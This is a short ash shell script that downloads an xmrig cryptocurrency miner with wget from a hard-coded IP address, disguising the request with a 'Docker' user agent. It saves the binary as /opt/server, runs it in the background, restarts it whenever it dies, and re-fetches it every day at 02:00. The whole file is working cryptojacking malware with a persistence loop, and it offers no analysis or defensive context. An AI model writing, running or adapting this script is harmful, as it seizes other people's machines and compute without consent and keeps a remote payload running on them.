#!/bin/ash
function mytestFunc() {
    echo "TEst func passed"
}

function Download() {
    wget --user-agent "Docker" -q -O "/opt/server" http://185.10.68.147/lin/64/xmrig >>/dev/null
    chmod +x /opt/server
}

while :
do
    ddd=$(date +%H)
    if [ $ddd == 02 ]
    then
        kill $ppid
        sleep 20
        Download
    fi
    if [ ! -f "/opt/server" ]
    then
        Download
    fi

    if  ! kill -0 $ppid
    then
        echo "run"
        /opt/server &
        ppid=$(echo $!)
    fi

    echo "pid $ppid"
    sleep 3700
done

